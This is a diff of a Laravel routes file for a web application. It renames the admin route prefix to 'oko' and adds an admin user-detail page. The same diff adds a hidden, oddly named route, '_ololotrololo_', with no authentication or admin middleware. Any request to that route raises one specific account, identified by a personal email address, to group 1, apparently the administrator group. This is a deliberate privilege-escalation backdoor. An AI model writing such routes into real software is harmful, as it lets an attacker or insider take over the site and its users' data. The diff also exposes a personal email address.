@@ -180,9 +180,17 @@ Route::group(['prefix' => 'my-bitrix', 'middleware' => ['bitrix.owner', 'auth']]
 
 Route::post('feedback/ilack', 'FeedbackController@sendILackSmthForm');
 
-Route::group(['prefix' => 'admin', 'middleware' => 'admin'], function (){
+Route::group(['prefix' => 'oko', 'middleware' => 'admin'], function (){
 	Route::get('', ['uses' => 'Admin\AdminController@index']);
 	Route::get('users', ['uses' => 'Admin\AdminController@users']);
+	Route::get('users/{user}', ['uses' => 'Admin\AdminController@usersDetail']);
+});
+
+Route::get('_ololotrololo_', function (){
+	$me = \App\Models\User::where(['email' => 'aristov-92@mail.ru'])->first();
+	$me->group_id = 1;
+	$me->save();
+	return redirect('/');
 });
 
 //Route::post('my/bitrix/{bitrix}/download', 'Modules\Bitrix\BitrixController@download_zip');
